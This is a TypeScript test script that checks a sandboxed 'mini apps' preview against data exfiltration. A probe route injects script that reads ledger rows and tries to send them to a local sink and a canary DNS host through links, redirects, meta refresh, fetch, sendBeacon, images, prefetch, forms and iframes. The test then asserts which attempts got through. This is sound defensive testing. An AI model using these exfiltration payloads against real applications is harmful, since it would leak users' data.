import assert from "node:assert/strict";
import { spawn } from "node:child_process";
import { existsSync, mkdirSync, readFileSync } from "node:fs";
import { createServer } from "node:http";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import electron from "electron";
import { launchMiniAppsFixture } from "../server/testing/mini-apps-fixture.ts";
import type { MiniAppMutationResult } from "../shared/mini-apps.ts";
import { mountPreview, parkUntilSignal, type MountedPreview } from "./testing/preview-fixture.ts";

assert(process.argv.slice(2).every((arg) => arg === "--check"), "Usage: node scripts/verify-mini-apps.ts [--check]");
const root = fileURLToPath(new URL("..", import.meta.url));
const fixture = await launchMiniAppsFixture();
const evidence = join(root, ".impeccable", "review");
mkdirSync(evidence, { recursive: true });
let preview: MountedPreview | undefined;
const sinkHits: string[] = [];
let sinkConnections = 0;
const sink = createServer((req, res) => { sinkHits.push(req.url ?? ""); res.end("Synthetic sink"); });
sink.on("connection", () => { sinkConnections += 1; });
await new Promise<void>((resolve) => sink.listen(0, "127.0.0.1", resolve));
const address = sink.address();
assert(address && typeof address !== "string");
const sinkUrl = `http://127.0.0.1:${address.port}`;
let outage = false;
try {
  await fixture.dataCall("data_sql", { sql: "CREATE TABLE inventory AS SELECT 'Pencil' AS item, 7::INTEGER AS quantity" });
  await fixture.api<MiniAppMutationResult>("POST", "/api/mini-apps", {
    requestKey: "fixture-inventory", expectedRevision: 0, slug: "inventory", title: "Inventory", description: "Synthetic inventory example",
    html: '<main style="padding:20px"><h1>Inventory</h1><p id="stock">Reading stock…</p><script>mausApp.query("stock",{}).then(p=>document.getElementById("stock").textContent=p.rows.map(r=>r.join(": ")).join("; "))</script></main>',
    bindings: [{ id: "stock", datasetId: fixture.dataset.datasetId, source: { schema: "main", table: "inventory" },
      fields: { item: { column: "item", sourceType: "VARCHAR", as: "text" }, quantity: { column: "quantity", sourceType: "INTEGER", as: "decimal", scale: 0 } },
      queries: { stock: { kind: "rows", columns: ["item", "quantity"], parameters: {}, filters: [], orderBy: [], pageSize: 10 } } }], publisherBotIds: [fixture.bot.id],
  }, 201);
  const second = await fixture.api<MiniAppMutationResult>("POST", `/api/mini-apps/${fixture.installed.app.id}/publish`, {
    ...fixture.publication, requestKey: "fixture-v2", expectedRevision: 1, title: "Bookkeeping", description: "Synthetic bookkeeping records",
  });
  preview = await mountPreview({ info: { url: fixture.url } }, {
    entry: "/scripts/testing/mini-apps-preview.tsx", route: "/__mini-apps.html", title: "Isolated Mini Apps", logLevel: "warn",
    extraRoutes: [
      { path: "/api/mini-apps", method: "GET", handler: async (_req, res) => {
        res.setHeader("content-type", "application/json");
        res.statusCode = outage ? 503 : 200;
        res.end(JSON.stringify(outage ? { error: "Synthetic temporary outage" } : await fixture.api("GET", "/api/mini-apps")));
      } },
      { path: "/__mini-app-outage", method: "POST", handler: (req, res) => { outage = req.url?.includes("on=1") === true; res.end("updated"); } },
      { path: "/__mini-app-fixture", handler: (_req, res) => { res.setHeader("content-type", "application/json"); res.end(JSON.stringify({ id: fixture.bot.id, threadId: fixture.bot.activeTaskId })); } },
      { path: "/__mini-app-update", method: "POST", handler: async (_req, res) => {
        await fixture.dataCall("data_sql", { sql: "CREATE OR REPLACE TABLE ledger_master AS SELECT * FROM ledger_master UNION ALL SELECT 'Food', '2026-04-04', '-1.00', 'Card', 'Daily', 'CNY', 'New record'" });
        res.end("updated");
      } },
      { path: "/__mini-app-sink", handler: (_req, res) => { res.setHeader("content-type", "application/json"); res.end(JSON.stringify({ hits: sinkHits, connections: sinkConnections })); } },
      { path: "/__mini-app-probe", handler: async (req, res) => {
        const vector = new URL(req.url!, "http://127.0.0.1").searchParams.get("vector");
        assert(["link", "assign", "replace", "meta", "resources"].includes(vector ?? ""));
        const doc = await fixture.document();
        const html = `<main id="probe">Synthetic probe</main><script>
          mausApp.query("outflow", {currency:"CNY"}).then(function (page) {
            document.getElementById("probe").textContent = JSON.stringify(page.rows);
            var url = ${JSON.stringify(sinkUrl)} + "/" + ${JSON.stringify(vector)} + "?data=" + encodeURIComponent(JSON.stringify(page.rows));
            window.probeReady = true;
            var vector = ${JSON.stringify(vector)};
            setTimeout(function () {
              if (vector === "link") { var a = document.createElement("a"); a.href=url; a.textContent="Go"; document.body.appendChild(a); a.click(); }
              if (vector === "assign") location.assign(url);
              if (vector === "replace") location.replace(url);
              if (vector === "meta") { var m = document.createElement("meta"); m.httpEquiv="refresh"; m.content="0;url="+url; document.head.appendChild(m); }
              if (vector === "resources") {
                fetch(url).catch(function () {}); navigator.sendBeacon(url,"sample");
                var img = document.createElement("img"); img.src=url; document.body.appendChild(img);
                ["prefetch","preconnect","dns-prefetch"].forEach(function(rel){var l=document.createElement("link");l.rel=rel;l.href=url;document.head.appendChild(l);});
                var dns=document.createElement("link");dns.rel="dns-prefetch";dns.href="//record-1554.miniapp-canary.invalid";document.head.appendChild(dns);
                var form=document.createElement("form");form.action=url;document.body.appendChild(form);form.submit();
                var f=document.createElement("iframe");f.src=url;document.body.appendChild(f);
              }
            }, 100);
          });</script>`;
        res.setHeader("content-type", "application/json");
        res.end(JSON.stringify({ document: { ...doc, html }, state: await fixture.api("GET", `/api/mini-apps/${second.app.id}/state`) }));
      } },
    ],
  });
  console.log(JSON.stringify({ previewUrl: preview.previewUrl, fixture: "Synthetic ledger and inventory", logPath: fixture.logPath }));
  if (process.argv.includes("--check")) {
    const env = { ...process.env };
    delete env.ELECTRON_RUN_AS_NODE;
    const child = spawn(electron as unknown as string, [join(root, "scripts/testing/mini-apps-ui-smoke.mjs"), fixture.dataDir, preview.previewUrl, evidence, "--blink-settings=imagesEnabled=true"], { env, stdio: "inherit" });
    const timeout = setTimeout(() => child.kill("SIGKILL"), 240_000);
    const code = await new Promise<number>((resolve, reject) => { child.once("error", reject); child.once("exit", (status) => resolve(status ?? 1)); });
    clearTimeout(timeout);
    const reportPath = join(evidence, "mini-apps-result.json");
    assert(existsSync(reportPath), `Electron ended with status ${code} before writing its report.`);
    const report = JSON.parse(readFileSync(reportPath, "utf8")) as { errors: string[] };
    assert.equal(code, 0, JSON.stringify(report));
    assert.deepEqual(report.errors, []);
    assert(sinkHits.length > 0 && sinkHits.every((hit) => hit.startsWith("/assign?")), `Unexpected probe requests: ${JSON.stringify(sinkHits)}`);
    console.log(JSON.stringify({ checks: "passed", evidence, sinkHits: sinkHits.length }));
  } else await parkUntilSignal();
} finally {
  await preview?.close();
  await fixture.close();
  await new Promise<void>((resolve) => sink.close(() => resolve()));
}
